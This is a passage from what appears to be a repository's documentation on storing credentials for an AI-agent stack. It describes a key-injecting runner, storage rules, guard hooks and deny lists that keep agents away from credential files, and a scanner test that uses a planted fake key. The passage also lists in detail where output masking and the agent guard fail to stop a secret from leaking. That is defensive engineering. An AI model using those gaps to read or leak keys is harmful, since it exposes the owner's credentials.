# Secret storage

How this stack keeps credentials on a host so that later sessions find them
without anyone retyping them, and so that nothing reaches GitHub. The decision
record, with the rejected alternatives and what would overturn it, is
[`decisions/2026-09-24-secret-storage.md`](decisions/2026-09-24-secret-storage.md).
The machine-readable list is
[`adoption/credential-inventory.json`](../adoption/credential-inventory.json).
[`scripts/credential_status.py`](../scripts/credential_status.py) checks a host
against it.

## The credentials this stack uses

| Inventory id | What it is | Status | Where it lives | Variable names |
| --- | --- | --- | --- | --- |
| `alpaca-paper` | Alpaca paper broker key pair | required now | `<store>/alpaca-paper.env` | `APCA_API_KEY_ID`, `APCA_API_SECRET_KEY` (optional, not secret: `APCA_API_BASE_URL`) |
| `alpaca-paper-2` | Alpaca paper broker key pair, second paper account (isolated incentive-monitor study) | optional | `<store>/alpaca-paper-2.env`, pointer `PAPER_ENV_FILE_2` | `APCA_API_KEY_ID`, `APCA_API_SECRET_KEY` (optional, not secret: `APCA_API_BASE_URL`) |
| `sec-contact` | SEC/EDGAR contact string. This is private personal data, not an auth secret | required now | `<store>/sec-contact.env` | `SEC_USER_AGENT` (optional: `EDGAR_IDENTITY`) |
| `databento` | Databento API key | only when you buy it | `<store>/databento.env` | `DATABENTO_API_KEY` |
| `typesafe` | Typesafe key, for the live-judge mode of `gap_crosswalk.py` only | only when you pay for it | `<store>/typesafe.env` | `TYPESAFE_API_KEY` |
| `omniroute` | OmniRoute local gateway key, one per lane. The workstation gateway runs keyless on loopback, so callers pass the placeholder `local-loopback` ([decision](decisions/2026-09-27-omniroute-account-pool.md)) | optional | `<store>/omniroute.env` | `OMNIROUTE_API_KEY` |
| `tavily` | Tavily API key. Until 2026-09-29 it lived only in the kernel keyring; its first file write comes from that copy through the create-only chain in [Kernel keyring](#kernel-keyring-transport-and-per-boot-spare-2026-09-29) | optional | `<store>/tavily.env` | `TAVILY_API_KEY` |
| `grafana-admin` | Local Grafana admin account and secret key | generated locally | `~/.config/ecosystem-observability/ecosystem-grafana.env` | `GF_SECURITY_*` |
| `nativestack-generation-key` | Host service key | generated locally | `~/.config/nativestack/generation.key` | none |
| `openhands-session` | OpenHands agent-server session key for one runtime-worker attempt ([decision](decisions/2026-09-28-openhands-resolver-isolation.md)) | generated locally, per attempt; deleted after the attempt's containers are confirmed removed | `~/.local/state/native-agent-stack/runtime-workers/openhands/secrets/<run-id>-<arm>.server.env`, plus the `.headers` file beside it | none on the host; `OH_SESSION_API_KEYS_0` exists only inside the agent-server container (Docker `--env-file`) |
| `claude-native`, `codex-native`, `gh-native` | Native sign-ins | stored by each tool | each tool's own store | none |
| `huggingface-native`, `huggingface-native-stored` | Hugging Face sign-in: the active token and every saved token | stored by `hf auth login`, one token per host ([Hugging Face sign-in](#hugging-face-sign-in)) | `$HF_HOME/token` and `$HF_HOME/stored_tokens`; `HF_HOME` defaults to `${XDG_CACHE_HOME:-$HOME/.cache}/huggingface` | none |
| `ibkr-gateway` | IB Gateway / TWS login | typed in at login, nothing stored | none | none |
| `github-actions` | `FOUNDATION_RESTORE_FIXTURE_20260920` and the per-job `github.token` | CI only | GitHub's encrypted secret store | none locally |

`<store>` means `${XDG_CONFIG_HOME:-$HOME/.config}/native-agent-stack`.

These should stay unset on the host, and child processes should never get
them: `GITHUB_TOKEN`, `GH_TOKEN`, `ANTHROPIC_API_KEY`, `OPENAI_API_KEY`,
`CODEX_API_KEY`, `HF_TOKEN` and its legacy name `HUGGING_FACE_HUB_TOKEN`
(which `huggingface_hub` still reads), `QDRANT_API_KEY`, `MASSIVE_API_KEY`, the alias
names `ALPACA_API_KEY`/`ALPACA_SECRET_KEY`, `TWS_*`/`IBKR_ACCOUNT_ID`, and the
names that appear only in catalogs (`MISTRAL_`, `PREFECT_`, `MC_`, `MSB_`,
`PAPERCLIP_`, `OPENROUTER_API_KEY`). The checker lists any that are set, by
name only. `HF_TOKEN_PATH` holds a path, not a secret, but it stays unset
too: it moves the Hugging Face token files away from where the checker, the
guard and the deny rules look. The checker lists it by name under
`native store path overrides`.

<a id="using-a-key"></a>

## Using a key (available, 2026-09-29)

The key runner is available. It is not yet the default path: it becomes the
default, and this section says so, after the command guard models it. Phase
2 of the same pull request series adds that model to
`scripts/hooks/secret_path_guard.py` and flips the default. Until then the
guard does not read the runner's command: a synthetic check accepted
`credential_run.py tavily -- tvly auth`, while the guard refuses a bare
`tvly auth` today, and `tvly auth` prints a key's first eight and last four
characters, which masking cannot catch. Use the runner with that limit in
mind, and keep `--json` on `tvly auth`.

An agent, a Codex or OmniRoute lane, a workflow step or a unit may use a
stored key through one command that names only the inventory id:
`python3 tools/credentials/credential_run.py <inventory-id> -- <command> [args...]`.
For example:

```sh
python3 tools/credentials/credential_run.py tavily -- tvly search "<query>" --depth basic --json
python3 tools/credentials/credential_run.py alpaca-paper --check
```

[`tools/credentials/credential_run.py`](../tools/credentials/credential_run.py)
reads the entry's `0600` file and starts the command with that entry's
declared variables added to its environment. `--only NAME` narrows them. The
caller's own copies of every inventory variable, every `must_not_be_set` name
and every other entry's pointer variable (`PAPER_ENV_FILE`,
`SEC_CONTACT_ENV` and the like, each the path of a store file) are removed
first; the entry's own pointer variables stay. No value goes into the
command line, a temporary file or a shell. The command's stdout and stderr
are relayed with each injected value replaced by `[REDACTED:<NAME>]`, raw or
encoded: base64 and base64url at every byte alignment; percent-encoding as
`quote()` and `quote_plus()` write it (with `/` kept or escaped, a space as
`%20` or `+`, in both hex cases); JSON escaping as Python writes it, with `/`
written `\/` (PHP's `json_encode`) and with `<`, `>` and `&` written
`\u003c`, `\u003e` and `\u0026` (Go's `encoding/json`), or `\u003C`
and `\u003E` (the tag flag of PHP's `json_encode`); and hex. A variable that
the entry lists in `public_variables`, such as `APCA_API_BASE_URL`, is
injected unmasked. The command's exit code, stdin and non-UTF-8 bytes pass
through. The runner forwards `SIGINT`, `SIGTERM`, `SIGHUP`, `SIGQUIT`,
`SIGUSR1`, `SIGUSR2` and `SIGALRM` to the command's process group and no
other signal (`SIGKILL` and `SIGSTOP` cannot be forwarded). `--check` starts
nothing: it prints the names it would inject and the file state (`ok`,
`missing` or `unsafe`). No subcommand prints or returns a value.

The runner refuses the following, naming the id, a variable or a line
number but never a value or a path:
- an unknown id, or an id whose key an engine, a native client or CI holds;
- a missing file, a file whose mode is not exactly `0600`, a symbolic or
  hard link, a file over 64 KiB, or a store directory that is not a private
  `0700` directory outside every Git worktree;
- a line that is not `export NAME=value`, or a value outside the grammar of
  [`set_credential.py`](../tools/credentials/set_credential.py). A
  hand-edited `$`, backtick or backslash is refused, never expanded;
- a masked value shorter than 6 bytes, which could not be masked without
  masking ordinary output (a public variable is not masked, so it has no
  minimum);
- an inventory entry that declares a variable the dynamic loader or the
  interpreter reads at start-up (`LD_*`, `DYLD_*`, `PYTHON*`), reason
  `reserved_variable`, before any store is read;
- a host whose `/proc/sys/kernel/core_pattern` begins with `|` (a program,
  such as systemd-coredump or apport) or `@` (a core socket), reason
  `core_pattern_pipe` or `core_pattern_socket`. `RLIMIT_CORE` 0 stops a core
  file, but the kernel sets the limit aside for those two, and
  systemd-coredump then journals the crashing process's environment, which
  holds the key. There is no override. The message names that file, never
  what it holds. A file that cannot be read is refused too (reason
  `core_pattern_unreadable`); a host without the file, such as macOS, skips
  the check. A `RLIMIT_CORE` that cannot be set to 0 is refused as well
  (`core_limit_not_set`).

**Adding a key** takes one step from the user. The agent runs
`bash tools/credentials/open_credential_terminal.sh <inventory-id>`, and
the user types the key once at the hidden prompt in the window it opens
([Adding or rotating a key](#adding-or-rotating-a-key-without-pasting-it-anywhere)).
For a new provider, the agent first adds the inventory entry in its own
worktree, together with the matching `SECRET_NAMES` line in
`scripts/hooks/secret_path_guard.py` that `tests/test_secret_path_guard.py`
requires. It then opens the window from that worktree.

**Output and shutdown.** The runner writes to a pipe or socket without
blocking, through a queue of at most 256 KiB per stream. A consumer that
stops reading holds the command back, as in any pipeline, but not the
runner. After a shutdown signal (`SIGINT`, `SIGTERM`, `SIGHUP` or `SIGQUIT`,
which the runner forwards to the command's process group) it waits for no
consumer: what is queued is dropped, and the runner exits with the
command's status. Once the command has exited, the consumer has 2 seconds
to take what is queued, and the rest is dropped. Dropping is safe, because
only masked bytes are queued. A terminal, a regular file and `/dev/null`
are written directly, and a descriptor that shares its open file
description with the command's stdin is not made non-blocking, so an
interactive terminal stays blocking for the command. The limits of this
path are in the list below.

**The command's lifetime.** The command leads its own session and process
group. Once it has exited and its output is drained, and on every way out of
the runner, the runner sends what is left of that group `SIGTERM` and, after 2
seconds, `SIGKILL`, so no descendant that stayed in the group is left running
with the key in its environment. It does this while the command is still a
zombie, whose pid holds the group's number, so that a stranger cannot have been
given that number and hit by a late signal. Then it tells the watchdog to stand
down, and only then reaps the command. If the runner itself is killed without a
chance to do that (`SIGKILL`, the out-of-memory killer, `timeout -k`), the
command asks the kernel for `SIGTERM` (Linux `PR_SET_PDEATHSIG`, armed after
the runner's signal handlers have been put back to their defaults in the
forked command, so that nothing there swallows it), and a small watchdog
process, started with the command in its own session and with an empty
environment, ends the command's whole group the same way when the pipe it
shares with the runner closes. The limits are in the list below.

**What masking does not cover.** Masking guards against accidents; it is
not a boundary.
- Only the entry's injected variables are masked, and a value is masked
  only where a whole form of it appears unbroken in one stream (2026-09-29).
  Printed as they are: a fragment (plain `tvly auth` prints a key's first
  eight and last four characters); a reversed, encrypted or otherwise
  transformed value; a nested encoding (an encoding of an encoding); base64
  wrapped across lines; another escaper (Gson's `\u003d` for `=`, or a
  percent-encoding with a safe set other than `/` or none); a value split
  between stdout and stderr; a value broken by wrapping or by other bytes
  between its parts (`xxd` or `hexdump -C` columns, `fold`, wrapped table
  cells, colour codes, two writers on one stream); hex with separators; a
  value with a single quote that the shell requotes (`set -x`,
  `printf %q`); and anything the command writes to an inherited read-write
  stdin (a terminal or a pty), which never passes through the relay.
- Stdout and stderr are masked separately. What the command writes to a
  file, a log or the network never passes the masker.
- Output that ends, or a command that is killed, part-way through a value
  shows `[REDACTED-PARTIAL:<NAME>]` for the unfinished part once it is 4
  bytes or longer. Up to 3 bytes of the start of a value's form can be
  printed, after 100 ms without output or at the end. The masker holds back
  at most the longest form minus one byte, however long a run of repeated
  matches is, so such a run can come out as several markers.
- The value sits in the command's environment. While it runs, other
  processes of the same uid can read it through `/proc/<pid>/environ`, or
  with `ps -E` on macOS. So can a debugger of the same uid, and `ptrace`:
  they are out of scope, as is a core dump that a collector takes despite
  the limit on a host the runner does not refuse.
- The guard hook runs only for Claude's Bash tool, and it does not read the
  runner's command yet (phase 2). Codex, OmniRoute lanes and units run no
  guard, so there the masking is the only layer.
- Output path, the non-blocking flag (2026-09-29). The runner sets it on the
  open file description of an inherited pipe or socket, and other writers
  on that description share it (`xargs -P` siblings, background jobs, a
  unit's other processes): they can see `EAGAIN` for the length of a run.
  With two runners on one pipe, the first to exit makes the pipe blocking
  under the second, and a runner killed with `SIGKILL` leaves the
  description non-blocking. The fix is planned for the hardening change
  before the default-path flip: `poll` and writes of at most `PIPE_BUF` for
  pipes, `send` with `MSG_DONTWAIT` for sockets, or a writer thread that can
  be abandoned, and never a flag flipped on an inherited description.
- Output path, the queue (2026-09-29). "A consumer that stops reading cannot
  hold the runner" holds only for the pipes and sockets the runner can make
  non-blocking. A terminal, a pty, a regular file, a descriptor that shares
  its description with stdin, and any sink that falls back to direct writes
  use blocking writes, and a consumer that stops reading can hold the
  runner there, past a shutdown signal.
- The command's lifetime (2026-09-29). A `SIGKILL` of the runner before its
  watchdog has started (a few milliseconds after the command's start) leaves
  only the parent-death signal, which reaches the command and not its
  children. If the runner dies after the command has exited but before it has
  stood the watchdog down, and init reaps the command before the watchdog
  acts, the group's number is nobody's for a moment: on a host with a small
  process-id space (macOS numbers stop at 99,999) it could in theory have
  been given to a stranger, whose group the watchdog would then signal. The
  watchdog reacts within milliseconds (about 1.3 ms, measured once on an
  idle host), which bounds that window. The runner
  itself never signals a group after it has reaped the command, but it can
  see the exit without reaping the command, and count the group's live
  members, only on Linux: macOS has no `/proc`, and its Python has no
  `os.waitid` before 3.13. Elsewhere the runner sees the exit by reaping the
  command and signals nothing after that, so a descendant of a command that
  has already exited is left running; only a failure inside the runner, while
  the command is unreaped, ends the group. A descendant that leaves the
  command's process group (`setsid`, `setpgid`, a double fork with `setsid`)
  is out of reach of the group kill and of the watchdog, and so is a
  set-user-ID command (the kernel clears the parent-death signal for such a
  binary, and its process cannot be signalled). Only Linux has been run: the
  watchdog has not been run on macOS. A same-user debugger or `ptrace` is out
  of scope.

**Units and other clients.**
- A systemd user unit may run its program through the runner:
  `ExecStart=/usr/bin/python3 -I <checkout>/tools/credentials/credential_run.py <inventory-id> -- <program>`.
  It reads the file at start, with no unlock and nothing in the manager's
  environment. Never pass a value through `Environment=`, `SetCredential=`,
  `systemctl --user set-environment` or `import-environment`.
  `EnvironmentFile=` stays only for the engines that already use it
  (Grafana, OmniRoute). The paper units keep their `--env-file` pointers
  until the trading lane decides otherwise.
- A launchd agent on macOS may do the same through `ProgramArguments`, with
  `EnvironmentVariables` holding `PATH` only
  ([macOS page](../adoption/platforms/macos-arm64.md#keys-under-launchd-drafted-2026-09-29-not-run-on-a-mac)).
- Never start Codex, or any other client, from a shell that exports a key:
  whatever the launcher exports can reach every command its model runs.
  The runner is how a key can reach those commands inside the command.
- An MCP stdio server that needs a key can be launched with the runner as
  its command, never with a `${VAR}` in its configuration.

## Storage rules

- Use one file per provider, under the store directory. The directory is mode
  `0700` and each file is `0600`, both owned by you. The store is outside every
  Git worktree, so a file in it cannot be committed.
- Each file holds `export NAME=value` lines. Quote a value that contains
  spaces, such as the SEC contact. Every parser in this repository accepts
  this form. `pit-availability/measure.py` accepts only this form.
- Repository code parses these files and never runs them as shell. The one
  exception is the catalyst-provenance recipe, which sources `sec-contact.env`
  with `set -a`. That is acceptable only because the file holds a contact
  string, not a credential.
- Never put a value in a shell rc file, a systemd unit, a launchd plist, a
  receipt, an issue, a chat, a gist or an agent prompt.
- Native sign-ins stay in each tool's own store and are never copied between
  hosts (`adoption/manifest.json` `authentication_transfer:
  native_login_on_target_only`).

## Adding or rotating a key without pasting it anywhere

Never paste a key into a chat, an issue, a prompt or a command line. Run:

```sh
tools/credentials/open_credential_terminal.sh <inventory-id>              # store or rotate a stored key
tools/credentials/open_credential_terminal.sh alpaca-paper --probe       # ...then probe the paper rate limit
```

The command opens a new terminal window: Windows Terminal on WSL2 (or a console window if Windows Terminal is missing), Terminal.app on macOS, or an X terminal on a Linux desktop. If it cannot open one, it prints the one command to run yourself. An agent may open the window, but it never sees what you type.

- **Before anything is typed**, the window prints the checkout's commit. It refuses if `tools/credentials/`, `scripts/credential_status.py` or `adoption/credential-inventory.json` has uncommitted changes, so you only ever type into committed code. It clears `PYTHONPATH`, `LD_PRELOAD` and similar variables, and runs Python with `-I`.
- **Stored keys:** `tools/credentials/set_credential.py <inventory-id>` accepts only operator-supplied entries (required, optional or paid) whose file sits directly in the store. It asks for each variable with hidden input, and refuses if the terminal cannot hide input. It writes `export NAME=value` lines atomically: a `0600` file in the `0700` store, outside Git, written through a directory handle opened without following symlinks. To replace an existing file you type `replace`, also hidden. Its one form without a terminal, `--from-env`, is create-only and exists for a key that already lives in the kernel keyring ([Kernel keyring](#kernel-keyring-transport-and-per-boot-spare-2026-09-29)).
- **Paper rate limit:** `tools/credentials/alpaca_rate_limit_probe.py` sends one read-only `GET /v2/account` to the fixed paper host. It follows no redirect, reads no response body and places no order. It saves only the HTTP status and the `x-ratelimit-*` headers, under `${XDG_STATE_HOME:-$HOME/.local/state}/native-agent-stack/rate-limit/`, where a later session can read them. `x-ratelimit-limit` is Alpaca's own per-account calls-per-minute figure (200 on the standard tier), so measuring it never needs order traffic. Agents may run it with `--env-file "$PAPER_ENV_FILE"`.

Live broker keys are out of scope for this repository. Live trading is handled outside it, and no tool here accepts a live endpoint.

## Picking up in a new session

Put the file paths, never the values, in your shell startup file once:

```sh
# ~/.bashrc or ~/.zshrc: pointers only; no credential value is exported
_nas_store="${XDG_CONFIG_HOME:-$HOME/.config}/native-agent-stack"
export PAPER_ENV_FILE="$_nas_store/alpaca-paper.env"
export PAPER_ENV_FILE_2="$_nas_store/alpaca-paper-2.env"   # second paper account, where this host holds one
export SEC_CONTACT_ENV="$_nas_store/sec-contact.env"
export PIT_ALPACA_ENV_PATH="$PAPER_ENV_FILE" PIT_SEC_ENV_PATH="$SEC_CONTACT_ENV"
unset _nas_store
```

Every later session, whether yours or an agent's, then uses the existing
recipes unchanged. For example:
`python3 runner.py preflight --env-file "$PAPER_ENV_FILE" ...`. Commands pass a
pointer and never spell out the store path, so the guard hook can block any
command that does spell it out.

Five consumers still read the Alpaca pair only from environment variables:
`alpaca-paper/paper_runner.py`, `alpaca-historical/collect.py`,
`security-identity/probe.py`, `security-identity/quality.py` and
`delisting-coverage/collect.py`. This is item A1 in
[`decisions/2026-09-24-community-sweep.md`](decisions/2026-09-24-community-sweep.md).
Until they are moved to `--env-file`, run them one invocation at a time in a
subshell, so that the values exist only in that child's environment:

```sh
( set -a; . "$PAPER_ENV_FILE"; set +a; exec python3 blueprints/us-equities/alpaca-paper/paper_runner.py ... )
```

The key runner ([Using a key](#using-a-key-available-2026-09-29)) is an
available alternative that puts the pair into that one command's
environment and masks it in the command's output. It is not yet the default
path, because the command guard does not read its command:

```sh
python3 tools/credentials/credential_run.py alpaca-paper -- python3 blueprints/us-equities/alpaca-paper/paper_runner.py ...
```

While either child runs, any process running under your uid can read its
environment through `/proc/<pid>/environ` or `ps e`. Prefer the `--env-file`
consumers.

## Setting up a new host (WSL2 or macOS)

Values never go through an agent, a chat, a gist, GitHub or shell history.

1. Clone, then run `python3 scripts/adoption_status.py` and
   `python3 scripts/credential_status.py`. Both only inspect the host and change
   nothing.
2. Sign in natively yourself: run `claude`, `codex login --device-auth`,
   `gh auth login` and then `gh auth setup-git`. On a host that downloads
   gated models, also run `hf auth login` as described in
   [Hugging Face sign-in](#hugging-face-sign-in). Start IB Gateway/TWS
   interactively if you use IBKR.
3. Create the store and one file per provider you need. Start each file from
   its template. `install` sets the mode as it creates the file, and it works
   the same way with GNU and BSD `install` because the source is a regular file:
   ```sh
   d="${XDG_CONFIG_HOME:-$HOME/.config}/native-agent-stack"
   install -d -m 700 "$d"
   install -m 600 docs/examples/alpaca-paper.env.example "$d/alpaca-paper.env"
   install -m 600 docs/examples/sec-contact.env.example "$d/sec-contact.env"
   ```
   Fill the values in a local editor. Never use `echo KEY=... >`.
   Where you can, issue a new key for each host at the provider, so that one
   host can be revoked without affecting the others. Alpaca paper allows only
   one pair per account, so move that file through your own private channel,
   such as your password manager or an `age`-encrypted file sent out of band.
4. Add the pointer lines from the previous section to your shell startup file.
5. Install the scanner before you enable the hook. The tracked
   [`scripts/git-hooks/pre-commit`](../scripts/git-hooks/pre-commit) runs
   whatever `gitleaks` resolves on `PATH`. Enabled first, it refuses every
   commit while gitleaks is missing, and it scans with no memory, task or time
   cap while the raw binary comes first on `PATH`. Unbounded gitleaks scans
   caused the 2026-09-24 memory kills recorded in
   [`next-host-stages.md`](next-host-stages.md).

   **5a. Install and verify gitleaks 8.30.1 and the guarded launcher.** On
   Linux/WSL2, check the pinned release archive against the release's checksum
   file (both pinned in
   [`wsl-native-tools/pins.json`](../blueprints/convergence-practice/wsl-native-tools/pins.json))
   and extract the binary into `$ECO_INSTALL_ROOT/tools/gitleaks-8.30.1/`,
   the directory `gitleaks-guarded` runs it from:
   ```sh
   ECO_INSTALL_ROOT="${ECO_INSTALL_ROOT:-$HOME/.local/share/codex-ecosystem}"
   base=https://github.com/gitleaks/gitleaks/releases/download/v8.30.1
   curl -fsSLO "$base/gitleaks_8.30.1_linux_x64.tar.gz"
   curl -fsSLO "$base/gitleaks_8.30.1_checksums.txt"
   sha256sum --check --ignore-missing gitleaks_8.30.1_checksums.txt   # gitleaks_8.30.1_linux_x64.tar.gz: OK
   mkdir -p "$ECO_INSTALL_ROOT/tools/gitleaks-8.30.1"
   tar -xzf gitleaks_8.30.1_linux_x64.tar.gz -C "$ECO_INSTALL_ROOT/tools/gitleaks-8.30.1" gitleaks
   ```
   Then install `ecosystem-bounded-run`, `gitleaks-guarded` and the `gitleaks`
   link beside them as in
   [`adoption/tools/README.md`](../adoption/tools/README.md#install-on-a-new-linuxwsl2-host).
   `gitleaks-guarded` runs `$ECO_INSTALL_ROOT/tools/gitleaks-8.30.1/gitleaks`
   unless `GITLEAKS_NATIVE` names another path. An existing install that
   unpacked the binary to `tools/gitleaks-8.30.1/payload/gitleaks` needs either
   `GITLEAKS_NATIVE` or the relative link below. The link needs no environment
   change, so sessions that are already running use it too:
   ```sh
   # Only for the payload/ layout:
   ln -s payload/gitleaks "$ECO_INSTALL_ROOT/tools/gitleaks-8.30.1/gitleaks"
   # Then, for every layout:
   command -v gitleaks                 # $ECO_INSTALL_ROOT/bin/gitleaks
   readlink "$(command -v gitleaks)"   # $ECO_INSTALL_ROOT/bin/gitleaks-guarded
   gitleaks version                    # 8.30.1; `version` execs the native binary and starts no scan
   ```
   On macOS the bounded front end is `gitleaks-guarded-macos`, and `gitleaks`
   must resolve to it: install the front end with a `gitleaks` link to it in a
   directory that comes before every directory holding the native binary on
   `PATH`, as in the macOS install steps of
   [`adoption/tools/README.md`](../adoption/tools/README.md#macos-gitleaks-guarded-macos-2026-09-24).
   The front end never looks `gitleaks` up on `PATH`. It runs
   `GITLEAKS_NATIVE` or the mise install path
   (`${MISE_DATA_DIR:-$HOME/.local/share/mise}/installs/gitleaks/8.30.1/gitleaks`,
   where the measured Mac's mise install of 8.30.1 put it), and refuses with
   exit 78 when that binary is missing or resolves to the front end itself
   ([`gitleaks-guarded-macos`](../adoption/tools/gitleaks-guarded-macos),
   lines 214-220), so the link cannot loop. It passes when `command -v gitleaks`
   is the link, `readlink "$(command -v gitleaks)"` names
   `gitleaks-guarded-macos`, and `gitleaks version` prints `8.30.1`. If
   `gitleaks` resolves to the native binary instead, every hook scan is
   unbounded.

   **5b. Enable the hook** in each clone, which replaces `.git/hooks` for that
   clone:
   ```sh
   git config core.hooksPath scripts/git-hooks
   git config --get core.hooksPath   # scripts/git-hooks: relative, so each worktree runs its own checkout's hook
   ```
   Then check the hook from a worktree with a staged file, once with clean
   content and once with a planted key (`git hook run` needs Git 2.36 or
   later). A throwaway worktree keeps both files out of your own index. The
   planted value is generated and inert, never a real key:
   ```sh
   t=$(mktemp -d) && git worktree add -q --detach "$t/w" && cd "$t/w"
   printf 'hook check\n' > clean.txt && git add clean.txt
   git hook run pre-commit; echo "exit=$?"   # "no leaks found", exit=0
   printf 'aws_access_key_id = AKIA%s\n' "$(LC_ALL=C tr -dc 'A-Z2-7' </dev/urandom | head -c 16)" > planted.txt
   git add planted.txt
   git hook run pre-commit; echo "exit=$?"   # "leaks found: 1", exit=1
   cd - >/dev/null && git worktree remove --force "$t/w" && rm -r "$t"
   ```
   Both results are needed: with nothing staged the hook also exits 0, so a
   clean pass alone does not show that the scan can find anything. The hook
   was added after `v2026.09.24.1`. In a checkout of that tag,
   `git hook run pre-commit` fails with `cannot find a hook named pre-commit`,
   and `git commit` runs no hook at all.

   **5c. The same setting enables the pre-push registry gate.** The tracked
   [`scripts/git-hooks/pre-push`](../scripts/git-hooks/pre-push) checks out
   the tip commit of each pushed ref into a detached worktree under `$TMPDIR`
   and runs the three registry tests that failed CI's `validate` job on six
   pull requests on 2026-09-27:
   `tests.test_osv_lockfile_coverage.LockfileInventoryTests.test_every_tracked_lockfile_and_manifest_is_listed`,
   `tests.test_blind_checkout.RepositoryClassificationTests.test_every_blueprint_value_under_a_label_key_is_classified`
   and
   `tests.test_workflow_security_coverage.NewWorkflowSecurityCoverageTests.test_all_published_workflows_are_listed_and_covered`.
   Like CI, which tests one commit per pull request, it does not test the
   commits between a ref's old and new tip.
   - **Refused:** a failure, a skip or an expected failure. So is a tip that
     lacks the three tests: an old tag, a `backup/*` branch, or an unrelated
     history such as a notes ref or an orphan branch. Push those with
     `git push --no-verify`, the explicit, visible override.
   - **Not tested:** a branch deletion, which needs neither zizmor nor Python.
   - **Prerequisites:** install the pinned zizmor 1.30.1 first
     ([`ci-security`](../blueprints/convergence-practice/ci-security/README.md):
     `uv tool install zizmor==1.30.1`). The workflow-coverage class skips
     without it, so the hook refuses every push that has a commit to test
     while `zizmor` is missing from `PATH`. The first `python3` on `PATH` must
     be 3.11 or later (`tomllib`). The macOS system `/usr/bin/python3` is 3.9
     (3.9.6 on CI's `macos-15` runner); with it, the `tomllib` import fails
     and the push is refused.
   - **Scratch location:** the hook refuses when git's own discovery finds a
     repository above `$TMPDIR`. An empty `.git` directory, such as the mount
     point a sandbox can leave in `/tmp`, is not a repository to git, so it
     is not refused. `$TMPDIR` defaults to `/var/tmp`, because the checkout is
     about 140 MB, and file-hierarchy(7) keeps `/tmp`, usually a tmpfs, for
     small files.
   - **Cleanup:** the hook removes its worktree when it exits and when it
     gets HUP, INT, QUIT, PIPE or TERM. A signal it cannot or does not trap,
     such as SIGKILL, can leave a `pre-push.*` directory behind; delete that
     directory, then run `git worktree prune`.

   Measured on WSL2 on 2026-09-27: 1.5 to 1.8 s for a push of one commit,
   most of it the checkout. Check it without pushing:
   ```sh
   zero=$(git hash-object --stdin </dev/null | tr '[0-9a-f]' '0')
   printf 'refs/heads/x %s refs/heads/x %s\n' "$(git rev-parse HEAD)" "$zero" |
     scripts/git-hooks/pre-push origin origin; echo "exit=$?"   # "Ran 3 tests", "OK", exit=0
   ```
6. Install the user-level guards with the Claude profile tools
   ([`adoption/bootstrap.md`](../adoption/bootstrap.md) step 4a):
   `python3 tools/adoption/install_claude_profile.py --only guard`, then render
   and apply the settings template. For Codex, add the snippet in
   [User-level guards](#user-level-guards-deployed-by-the-claude-profile) by hand.
7. Run `python3 scripts/credential_status.py` again until every required entry
   reports `ok`.
8. Run the fail-closed check with a synthetic file, never a copy of the real
   one:
   ```sh
   t=$(mktemp -d); printf 'export APCA_API_KEY_ID=fake\nexport APCA_API_SECRET_KEY=fake\n' > "$t/p.env"
   chmod 644 "$t/p.env"
   python3 blueprints/us-equities/adaptive-paper/runner.py preflight --env-file "$t/p.env" --output "$t/o.json"
   echo "exit=$?"; cat "$t/o.json"   # expect exit=3, "error_type": "SafetyError", no value anywhere
   rm -rf "$t"
   ```
   Measured on WSL2 on 2026-09-24: exit 3, and the output file held only
   `status`, `error_type` and `reconciliation`.
   Past receipts do not certify a new host.
9. Services and timers (systemd user units on WSL, launchd agents on macOS)
   pass `--env-file` with the conventional path, for example
   `%h/.config/native-agent-stack/alpaca-paper.env` in `ExecStart=`. Do not
   use `EnvironmentFile=`: it puts the values into
   `/proc/<pid>/environ`. No secret is written into the unit or plist.
   Model-serving units need no Hugging Face token at all: they serve from a
   pinned local directory, and new units set `Environment=HF_HUB_OFFLINE=1`
   (see [Hugging Face sign-in](#hugging-face-sign-in) for llama.cpp, which
   does not read it).

## Hugging Face sign-in

Gated model repositories need an authenticated download. Access to a gated
model is requested in the browser, on the model's page, and downloads then
need a token of an account that was granted access
([gated models](https://huggingface.co/docs/hub/models-gated)). Each host that
downloads gated models signs in natively, once. Agents then use that sign-in
through `hf`, which reads the token itself, so the value never enters an
agent's context.

**Where the token lives.** `hf auth login` writes the active token to
`$HF_HOME/token` and every saved token, by name, to `$HF_HOME/stored_tokens`.
It creates both files with mode `0600` and sets their directory to `0700`.
`HF_HOME` defaults to `~/.cache/huggingface`, or to
`$XDG_CACHE_HOME/huggingface` when `XDG_CACHE_HOME` is set, and
`HF_TOKEN_PATH` overrides the active token's path
([environment variables](https://huggingface.co/docs/huggingface_hub/package_reference/environment_variables)).
The inventory rows `huggingface-native` and `huggingface-native-stored` use
the same default, so `scripts/credential_status.py` checks the files `hf`
uses. These facts were checked on 2026-09-25 against the installed
`huggingface_hub` 1.32.0 source (`constants.py`, `utils/_auth.py`, `utils/_headers.py`,
`_login.py`, `cli/auth.py`) and the same files at the upstream `v2.0.0` tag.

- Nothing goes in your shell startup file for Hugging Face. Never export
  `HF_TOKEN` or `HUGGING_FACE_HUB_TOKEN`: either one takes precedence over the
  stored token and reaches every child process.
- Leave `HF_TOKEN_PATH` unset. It moves both files. The checker and the deny
  rules do not follow it, and the guard catches only a reader, copy or input
  redirect that spells `$HF_TOKEN_PATH`, not the path it holds.
- Put model files elsewhere with `--local-dir` or `HF_HUB_CACHE`, not by
  pointing `HF_HOME` somewhere else. A process with another `HF_HOME` does not
  see the sign-in.

**One token per host, least privilege.** At
<https://huggingface.co/settings/tokens>, create a **fine-grained** token for
this host alone, with only the repository permission *Read access to contents
of all public gated repositories you can access*. Hugging Face recommends one
token per machine, so one host can be revoked without affecting the others,
and fine-grained tokens for production use
([user access tokens](https://huggingface.co/docs/hub/security-tokens)). The
permission name and a prefilled form
(<https://huggingface.co/settings/tokens/new?canReadGatedRepos=true&tokenType=fineGrained>)
are from Hugging Face's
[gated-model guide](https://huggingface.co/docs/microsoft-azure/guides/access-gated-models).
Add another permission only when a later task needs it.

**Sign in from your own terminal**, never through an agent:

```sh
hf auth login                          # choose "Paste an access token"; input is hidden
hf auth whoami                         # prints the account name and organizations only
python3 scripts/credential_status.py   # huggingface-native and huggingface-native-stored: ok, mode=0600
```

- Choose *Paste an access token* and paste the token at the hidden prompt
  (`Enter your token (input will not be visible)`). The default browser
  login saves an OAuth token and its refresh token instead of your
  fine-grained one, and you do not choose its permissions: `hf` asks for the
  device code with only its client id. An agent that runs `hf auth login`
  always gets that browser flow, which is another reason to sign in yourself
  ([CLI guide](https://huggingface.co/docs/huggingface_hub/guides/cli)).
- Never pass `--token`: the value would land in shell history, the process
  list and any transcript. Never pass `--add-to-git-credential`: it copies
